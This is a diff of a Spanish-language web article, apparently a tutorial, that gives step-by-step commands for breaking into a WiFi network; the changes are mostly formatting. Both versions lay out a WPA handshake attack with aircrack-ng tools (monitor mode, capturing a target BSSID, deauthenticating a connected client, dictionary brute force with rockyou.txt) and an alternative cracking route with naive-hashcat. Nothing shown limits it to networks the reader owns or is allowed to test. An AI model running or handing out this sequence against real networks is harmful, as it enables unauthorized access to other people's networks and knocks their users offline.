@@ -23,101 +23,120 @@ Este artículo detalla los pasos básicos para hackear una red WiFi mediante un 
 
 ## Pasos para hackear una red WiFi
 
-1. **Conectar la antena.**
+<br>
+**1. Conectar la antena.**
 
-2. **Instalar Aircrack-ng:**
+<br>
+**2. Instalar Aircrack-ng:**
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>sudo apt install aircrack-ng</code></pre>
 </div>
 
-3. **Cambiar a usuario root:**
+<br>
+**3. Cambiar a usuario root:**
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>sudo su</code></pre>
 </div>
 
-4. **Verificar y matar procesos que puedan interferir con la antena:**
+<br>
+**4. Verificar y matar procesos que puedan interferir con la antena:**
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>airmon-ng check 
 airmon-ng check kill</code></pre>
 </div>
 
-5. **Iniciar la antena en modo monitor:**  
-   (Utiliza el nombre de la antena que se muestra con el comando `ifconfig`.)
+<br>
+**5. Iniciar la antena en modo monitor:**  
+(Utiliza el nombre de la antena que se muestra con el comando `ifconfig`.)
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>airmon-ng start nombreAntena</code></pre>
 </div>
 
-6. **Escanear las redes disponibles:**
+<br>
+**6. Escanear las redes disponibles:**
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>airodump-ng nombreAntenaModoMonitor</code></pre>
 </div>
 
-7. **Identificar el BSSID** de la red a la que se quiere acceder.
+<br>
+**7. Identificar el BSSID** de la red a la que se quiere acceder.
 
-8. **Capturar paquetes para obtener el handshake:**
+<br>
+**8. Capturar paquetes para obtener el handshake:**
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>airodump-ng -c NumeroCanalDeLaRed --bssid bssid -w nombreArchivosCaps nombreAntenaModoMonitor</code></pre>
 </div>
 
-9. **Enviar paquetes de desautenticación:**  
-   Mantén abierto el terminal y ejecuta:
+<br>
+**9. Enviar paquetes de desautenticación:**  
+Mantén abierto el terminal y ejecuta:
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>sudo aireplay-ng -0 9 -a bssid -c estaciónDesautenticada nombreAntenaModoMonitor</code></pre>
 </div>
 
-10. **Realizar el ataque de fuerza bruta:**
+<br>
+**10. Realizar el ataque de fuerza bruta:**  
+Cuando se consiga el handshake, se crean los archivos necesarios. Realizar ataque de fuerza bruta en el archivo `.cap`:
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>aircrack-ng -b handshakeObtenido -w rockyou.txt archivo.cap</code></pre>
 </div>
 
-11. **Detener la antena en modo monitor:**
+<br>
+**11. Detener la antena en modo monitor:**
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>airmon-ng stop nombreAntena</code></pre>
 </div>
 
+---
+
 ## Métodos adicionales para obtener la contraseña
 
-Si cuentas con un ordenador con Linux nativo, puedes seguir estos pasos:
-
-1. **Clonar el repositorio de naive-hashcat:**
+<br>
+**1. Clonar el repositorio de naive-hashcat:**
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>git clone https://github.com/brannondorsey/naive-hashcat</code></pre>
 </div>
 
-2. **Compilar el código en el directorio `src`:**
+<br>
+**2. Compilar el código en el directorio `src`:**
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>cd naive-hashcat/src
 make</code></pre>
 </div>
 
-3. **Convertir el archivo `.cap` a `.hccapx`:**
+<br>
+**3. Convertir el archivo `.cap` a `.hccapx`:**
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>cap2hccapx.bin archivo.cap archivoHash.hccapx</code></pre>
 </div>
 
-4. **Descargar el diccionario rockyou:**
+<br>
+**4. Descargar el diccionario rockyou:**
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>curl -LO https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</code></pre>
 </div>
 
-5. **Ejecutar naive-hashcat:**
+<br>
+**5. Ejecutar naive-hashcat:**
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>HASH_FILE=archivoHash.hccapx POT_FILE=archivo.pot HASH_TYPE=2500 ./naive-hashcat.sh</code></pre>
 </div>
+
+---
 
 ## Alternativas y Recursos
 
